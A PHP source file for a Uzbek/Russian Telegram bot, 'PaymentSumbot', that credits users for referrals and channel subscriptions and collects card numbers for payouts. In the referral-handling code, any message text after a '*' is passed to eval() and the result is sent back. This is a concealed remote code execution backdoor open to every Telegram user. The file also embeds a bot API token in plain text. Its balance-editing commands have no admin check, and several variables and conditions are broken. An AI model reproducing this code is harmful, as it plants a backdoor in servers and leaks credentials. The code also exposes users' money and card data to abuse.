<?php
ob_start();
define('API_KEY','671476621:AAF8354fQDlO0sulolWPRCz6zeQLFvaGUFM');
$admin = "519213791"; //admin id
$kanalimz ="@PaymentSum"; //kanal useri
$botim = "PaymentSumbot";
   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}


  
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$callback = $update->callback_query;    
$data = $update->callback_query->data;  
$cid2 = $update->callback_query->message->chat->id;  
$message_id = $update->callback_query->message->message_id;
$filee = "coin/$cid.step";
$folder = "coin";
$folder2 = "azo";


if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by ');
}

if (!file_exists($folder2.'/test.fd3')) {
  mkdir($folder2);
  file_put_contents($folder2.'/test.fd3', 'by ');
}

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}


$tx = $message->text;
$name = $message->chat->first_name;
$user = $message->from->username;
$kun1 = date('z', strtotime('5 hour'));

$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"☀️Pul ishlash"]],
[['text'=>"👬Referal"],['text'=>"💻Mening kabinetim"]],
[['text'=>"☎️Aloqa"],['text'=>"🔻Pul chiqarish"]],
]);
$reklama = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📪Botda rasilka qilish"]]]
]);
$reklama1 = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"📪Рассылка в боте"]]]
]);

 $menu = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"☀️Заработать"]],
[['text'=>"👬Рефералы"],['text'=>"💻Мой кабинет"]],
[['text'=>"☎️Контакт"],['text'=>"🔻Вывод"]]
]);
if((mb_stripos($tx,"/start")!==false) or ($tx == "Orqaga")) { 
  bot('sendmessage',[   
   'chat_id'=>$cid,   
     'parse_mode'=>'markdown',   
   'text'=>"[$name](tg://user?id=$chat_id) - 🇺🇿Tilni tanlang:
————————
🇷🇺Выберите язык:",   
  'reply_markup'=>json_encode([   
   'inline_keyboard'=>[   
      
          [['text'=>'🇺🇿O`zbekcha', 'callback_data' => "uzbek"]], 
     [['text'=>'🇷🇺Русский', 'callback_data' => "ruscha"]],
]   
])   
]);  
  $baza = file_get_contents("coin.txt");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
$baza=file_get_contents("coin.txt");
    file_put_contents("coin.txt","$baza\n$cid");
  }
}
  if($data == "uzbek"){ 
bot('sendMessage',[ 
     'chat_id'=>$cid2, 
     'text'=>"🎉Do'stlaringizni taklif qiling va ko'proq pul ishlang", 
     'parse_mode'=>'markdown', 
     'reply_markup'=>$key, 
]); 
} 
  if($data == "ruscha"){ 
bot('sendMessage',[ 
     'chat_id'=>$cid2, 
     'text'=>"🎉Приглашайте друзей и зарабатывайте с их подписок!", 
     'parse_mode'=>'markdown', 
     'reply_markup'=>$menu, 
]); 
} 
if(strpos($tx,"/start $cid")!==false){
  
}else{
  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.txt";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,$cid) !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"❌ERROR",
      ]);
    } else {$id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);
      $ab=file_get_contents("coin/$refid.soni");
      $ab=$ab+1;
      file_put_contents("coin/$refid.soni","$ab");
      $usr = file_get_contents("coin/$refid.txt");
      $usr = $usr + 1500;
      file_put_contents("coin/$refid.txt", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
      'text'=>"😃Do'stingizni taklif qilganingiz uchun sizga 1500 so'm berildi! 😎 \n 😃 Вам начислен 1500 сум за  приглашенного вами друга 😎 ",
      ]);
    }
  }
}
$abb=file_get_contents("coin/$cid.txt");
if($abb){}else{
  file_put_contents("coin/$cid.txt", "0");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'text'=>$balinfo,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
  ]);
}
if($tx == "💻Mening kabinetim"){
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.txt");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"💻Mening kabinetim:
    🆔Sizning ID: $cid\n👥Taklif qilgan referallaringiz: $odam ta \n💵Jami balansingiz: $ball so'm",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2, 
      ]);
    }
}
if($tx=="🔻Pul chiqarish"){
   $ball = file_get_contents("coin/$cid.txt");
   $rubl = $ball/135;
    bot('sendmessage',[
        'chat_id'=>$cid,
'parse_mode'=>'markdown',
        'text'=>"*Chiqarish uchun:* `$ball so'm bor($rubl rubl)`. *Pul chuqarish uchun 20ta do'stingizni taklif qilin va 💳Plastik karta raqamini yoki sms yozing 📩@PaymentSumSupportbot bilan bog'laning.*"
        ]);
    
    
}
if(strpos($tx,"/pul")!==false){
    $ex=explode(" ",$tx);
    $ab=file_get_contents("coin/$cid.txt");
    
    if( $ex[2]>=30000 and $ab>=$ex[2] ){
$bb=$ab-$ex[2];
$t=file_get_contents("tolov.txt");
$t=$t+1;
file_put_contents("tolov.txt","$t");
$t=file_get_contents("tolov.txt");
  file_put_contents("coin/$cid.txt","$bb");
  $tolov=file_get_contents("tolovlar.txt");
  $tolov=$tolov+$ex[2];
  file_put_contents("tolovlar.txt","$tolov");

$bb=substr($ex[1],0,6);
$gg="xx";
$ss=substr($ex[1],8,8);
  file_put_contents("$cid.t","🔵Status - ✅ \n\n 🆔 Tolov id: $t \n\n 👤 Qabul qiluvchini raqami: \n\n ☎️$bb $gg $ss \n\n 💰 Tolov summasi: $ex[2] sum");
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"✅To'lov qabul qilindi! Endi kuting. To'lov 24 soat ichida amalga oshiriladi. ADMIN: @PaymentSumSupportbot/ ✅Оплата принимается! Просто подождите. Оплата будет произведена в течение 24 часов. АДМИН: @PaymentSumSupportbot"
        ]);
        
        bot('sendmessage',[
            'chat_id'=>$admin,
            'text'=>"*Pulni yechish uchun yangi zayavka tushdi * \n` zayavkachi haqida ma'lumot\n id raqami $cid\n username: @$user \n Ismi: `[$name](tg://user?id=$cid) \n *Tushuriladigon summa miqdori:$ex[2] sum  \n Raqami: $ex[1] \n\n Pul tolandimi tolangan bolsa tolandi=$cid shunday deb yozing!!* ",
            'disable_web_page_preview'=>true,
            'parse_mode'=>markdown,
            ]);
          
}else{bot('sendmessage',['chat_id'=>$cid,'text'=>"❌Hisobingizda yetarli mablag' yo'q / ❌У вашей учетной записи недостаточно средств"]);} }
if($tx=="☎️Aloqa"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🤓 Bot Admini: @PaymentSumSupportbot"
        
        ]);
    
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "👬Referal"){
       $odam=file_get_contents("coin/$cid.soni");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🎁Referal taklif qilib pul ishlang\n👥Referallaringiz soni: $odam ta\n💸Har bir referal uchun: 1500 so'm\n🤝Hamkorlik havolasi: https://t.me/$botim?start=$cid\n\n",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }$reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
  
    $nocha = "Xozircha kanallar yoq!";
    $noazo = "siz kanal royxatida yoqsiz.";
    $okcha = "kanalga azo boldingiz va 1ga ega boldingiz 3 kun ichida chiqib ketsangiz 5000 som shtraf.";

    }
}if(strpos($tx,"tolandi=" and $cid == $admin)!==false){
    $ex=explode("=",$tx);
    $kanalimiz="-1001179289576";
    $ab=file_get_contents("$ex[1].t");
    bot('sendmessage',[
        'chat_id'=>$kanalimiz,
        'text'=>"$ab"
        ]);
    bot('sendmessage',[
        'chat_id'=>$admin,
        'text'=>"Kanalga tashlandi!!"
        ]);
}
if(stripos($tx,"/yoqot")!==false){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.txt");
$usr -= $ex[2];
      file_put_contents("coin/$refid.txt", "$usr");
    }
    if(stripos($tx,"/birga")!==false){
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.txt");
$usr += $ex[2];
      file_put_contents("coin/$refid.txt", "$usr");
        }
if((stripos($tx,"/Kanal")!==false)){
      $ex=explode("=",$tx);
      file_put_contents("rekla.php", "$ex[1]|$ex[2]|0");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"📣Kanal: ".$ex[2]."\n👥Keraklik odam soni:".$ex[1]."\n❗️Boshqa  kanal qoshmay turing  aks holda bot adashib ketadi kanalga keraklik odam qoshilgandan song bot ozi habar beradi shunda qoshsangiz boladi!",
      'reply_markup'=>$key,
      ]);
    }
    if($tx == "☀️Pul ishlash"){
      $get = file_get_contents("rekla.php");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("rekla.php");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"Kanal qoshishingiz mumkin",
        'reply_markup'=>$key,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanallar topilmadi. Iltimos keyinroq urunib ko'ring.",
        'reply_markup'=>$key,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"💲Topshiriq
1️⃣Kanalga o'ting ➡️ $kanal, a'zo bo'ling va 🔝5-10 post koring , tekshirishni bosing.
2️⃣⚡️Shunday a'zo bo'lib, 💸 ko'proq pul ishlang!",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"✅Tekshirish"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanallar topilmadi. Iltimos keyinroq urunib ko'ring.",
        'reply_markup'=>$key,
        ]);
      }
    }
if(strpos($tx,$cid)!==false){
$azo=file_put_contents("coin/$cid.txt","");
}
    if($tx == "✅Tekshirish"){
      del("coin/$cid.step");
      $get = file_get_contents("rekla.php");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"⚔️G'irromlik qilmang, kanalga faqat bir marta a'zolik uchun pul to'lanadi",
          'reply_markup'=>$key,
          ]);
        }else{
          $get = file_get_contents("rekla.php");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;
          if($gget == "member"){
            $now += 1;
            file_put_contents("rekla.txt", "$odam|$kanal|$now");
            $kabin = file_get_contents("coin/$cid.txt");
            $kabi = $kabin + 1000;
            file_put_contents("coin/$cid.txt", "$kabi");
            $time = date('d', strtotime('5 hour'));
            file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"🎉A'zo bo'lganingiz uchun rahmat, siz  botimizda : 1000so'm ga ega bo'ldingiz!💸
 💲Sizning hozirgi balansingiz: $ball🎊",
            'reply_markup'=>$key,
            ]);
          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"Siz kanalga azo bolmadingiz",
            'reply_markup'=>$key,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Kanallar topilmadi. Iltimos keyinroq urunib ko'ring.",
        'reply_markup'=>$key,
        ]);
      }
    }
    //========================РУССКЫЙ=====================================
    if($tx == "💻Мой кабинет"){
      
       $odam=file_get_contents("coin/$cid.soni");
      $ball = file_get_contents("coin/$cid.txt");{
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"💻 Мой кабинет:
    🆔Ваш ID: $cid\n👥Ваши рефералы: $odam\n💵Всего заработано: $ball сум",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2, 
      ]);
    }
}
if($tx=="🔻Вывод"){
   $ball = file_get_contents("coin/$cid.txt");
   $rubl = $ball/135;
    bot('sendmessage',[
        'chat_id'=>$cid,
'parse_mode'=>'markdown',
        'text'=>"К выводу доступно $ball.  Для вывода пригласите 20 человек и напишите свой 💳пластик карта номер или напишите 📩смс на @PaymentSumSupportbot. "
        ]);
    
    
}

if($tx=="☎️Контакт"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"🤓Админ бота @PaymentSumSupportbot",
        
        ]);
    
}

if(isset($tx)){
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $cid,
  ]);
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){

    if($tx == "👬Рефералы"){
       $odam=file_get_contents("coin/$cid.soni");
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"🎁🎁Получайте бонусы за приглашённых друзей.\n👥Ваши рефералы: $odam\n💸Доход с рефералов: 1500 сум\n🤝Партнерская программа: https://t.me/$botim?start=$cid\n",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }$reply_menu = json_encode([
           'resize_keyboard'=>false,
            'force_reply' => true,
            'selective' => true
        ]);
     $replyik = $message->reply_to_message->text;
    $yubbi = "📨Yuboriladigan xabar matnini kiriting. Xabar turi markdown";

    if($tx == "/send" and $cid == $admin){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'parse_mode'=>'html',
      'text'=>$yubbi,
     'reply_markup'=>json_encode([
      'resize_keyboard'=>true,
      'keyboard'=>[
        [['text'=>'Orqaga']],
        ]
        ])
        ]);
      file_put_contents("coin/$cid.step","send");
    }

    if($step == "send" and $cid == $admin){
      ty($cid);
      if($tx == "Orqaga"){
      del("coin/$cid.step");
      }else{
      ty($cid);
      $idss=file_get_contents("coin.txt");
      $idszs=explode("\n",$idss);
      foreach($idszs as $idlat){
      bot('sendMessage',[
      'chat_id'=>$idlat,
      'text'=>$tx,
      'parse_mode'=>'html',
       'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [['text'=>"🗣Канал",'url'=>"https://t.me/PaymentSum"]],
  ]
  ])
  ]);
} 
      del("coin/$cid.step");
      }
    }
    $nocha = "В настоящее время каналов нет!";
    $noazo = "Вы не находитесь в списке каналов.";
    $okcha = "kanalga azo boldingiz va 1ga ega boldingiz 5 kun ichida chiqib ketsangiz 5000som shtraf.";

    }else{
    bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Вы не можете использовать бота без регистрации с каналом/ Канал: $kanalimz / Botdan to'liq foydalanish uchun $kanalimz kanaliga a'zo bo'ling",
    ]);
  }
}
    if($tx == "☀️Заработать"){
      $get = file_get_contents("rekla.php");
      if($get){
        list($odam,$kanal,$now) = explode("|",$get);
        if($odam == $now){
        unlink("rekla.php");
        bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"Kanal qoshishingiz mumkin",
        'reply_markup'=>$menu,
        ]);
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Каналов не найдено. повторите попытку позже",
        'reply_markup'=>$menu,
        ]);
        }else{
        file_put_contents("coin/$cid.step","chek");
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"💲Задание:
 1️⃣ Перейдите на канал ➡️$kanal, подпишитесь ✔️, нажмита Подтвердить и пролистайте ленту вверх 🔝👁 (5-10 постов).
 2️⃣ Возвращайтесь⚡️сюда, чтобы получить 💸 вознаграждение.",
        'reply_markup'=>json_encode([
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"✅Подтвердить"],],
        ]
        ]),
        ]);
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Каналов не найдено. повторите попытку позже",
        'reply_markup'=>$menu,
        ]);
      }
    }
if(strpos($tx,$cid)!==false){
$azo=file_put_contents("coin/$cid.txt","");
}
    if($tx == "✅Подтвердить"){
      del("coin/$cid.step");
      $get = file_get_contents("rekla.php");
      if($get){

        list($odam,$kanal,$now) = explode("|",$get);
        $tekshir = file_get_contents("azo/$cid.$kanal");

        if($tekshir){
          bot('sendMessage',[
          'chat_id'=>$cid,
          'text'=>"⚔Не волнуйтесь, канал будет взиматься только за членство один раз",
          'reply_markup'=>$menu,
          ]);
        }else{
          $get = file_get_contents("rekla.php");
          list($odam,$kanal,$now) = explode("|",$get);
          $gett = bot('getChatMember',[
          'chat_id' => $kanal,
          'user_id' => $cid,
          ]);
          $gget = $gett->result->status;
          if($gget == "member"){
            $now += 1;
            file_put_contents("rekla.txt", "$odam|$kanal|$now");
            $kabin = file_get_contents("coin/$cid.txt");
            $kabi = $kabin + 1000;
            file_put_contents("coin/$cid.txt", "$kabi");
            $time = date('d', strtotime('5 hour'));
            file_put_contents("azo/$cid.$kanal", "$kanal|$cid|$time");
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"🎉Спасибо за подписку, вы получили  на сумму:  1000 сум💸.
💲Ваш баланс: $ball сум💸",
            'reply_markup'=>$menu,
            ]);
          }else{
            bot('sendMessage',[
            'chat_id'=>$cid,
            'text'=>"Вы не подписаны на канал",
            'reply_markup'=>$menu,
            ]);
          }
        }
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"🔄Каналов не найдено. повторите попытку позже",
        'reply_markup'=>$menu,
        ]);
      }
    }

?>